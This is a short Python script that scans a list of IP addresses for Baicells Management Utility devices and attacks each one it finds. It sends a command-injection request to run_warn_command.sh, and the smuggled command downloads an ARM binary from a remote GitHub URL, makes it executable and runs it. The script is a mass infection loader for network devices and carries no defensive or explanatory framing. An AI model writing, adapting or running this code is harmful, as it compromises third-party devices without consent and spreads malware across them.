import requests
from threading import Thread

command = "wget%20https%3A%2F%2Fraw.githubusercontent.com%2F20Matrix77%2Fjdifjshfirej%2Frefs%2Fheads%2Fmain%2Farmv7%3Bchmod%20777%20armv7%3B.%2Farmv7"
exec_msg = "$UICIDEBOY$"

port = "80"

def load_ips(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def loader(file_path):
    ip_list = load_ips(file_path)
    for ip in ip_list:
        Thread(target=main, args=(ip, )).start()

def main(ip):
    try:
        headers = {"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0"}
        r = requests.get(f"http://{ip}:{port}", headers=headers)
        if "Baicells Management Utility" in r.text:  
            print("found -> " + ip)
            req = requests.post(f"http://{ip}:{port}/utility/run_warn_command.sh", 
                                data=f"commands=S||{command}&hash=browser_time%3D1608466780", 
                                headers=headers)
            
            if exec_msg in req.text:
                print(f"Success: {ip}")
    except Exception as c:
        pass

loader('ips.txt')
